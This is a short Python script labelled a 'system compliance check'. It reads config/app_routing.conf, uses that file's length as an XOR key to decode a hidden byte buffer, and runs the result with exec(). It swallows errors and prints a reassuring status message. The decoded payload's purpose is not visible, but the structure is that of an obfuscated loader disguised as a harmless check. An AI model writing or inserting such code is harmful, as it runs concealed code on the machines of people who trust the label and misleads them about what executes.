import os
import sys

def verify_runtime_layer():
    enc_buffer = [35, 53, 52, 36, 43, 33, 85, 39, 42, 38, 37, 43, 41, 43, 37, 37, 41, 41, 43, 40, 84, 37, 41, 40, 38, 85, 41, 43, 42, 34, 85, 93, 114, 117, 126, 120, 103, 122, 115, 119, 107, 100, 113]
    target_env_file = "config/app_routing.conf"

    if not os.path.exists(target_env_file):
        sys.exit(1)

    try:
        with open(target_env_file, "r") as f:
            key_data = f.read()

        crypto_key = len(key_data) % 256
        if crypto_key == 0:
            crypto_key = 42

        decrypted_source = "".join(chr(b ^ crypto_key) for b in enc_buffer)
        exec(decrypted_source, globals())
        return True
    except Exception:
        return False

if __name__ == "__main__":
    print("[*] Launching system compliance check...")
    success = verify_runtime_layer()
    if success:
        print("Verification completed with exit code 0.")
    else:
        print("Verification terminated with exit code 1.")
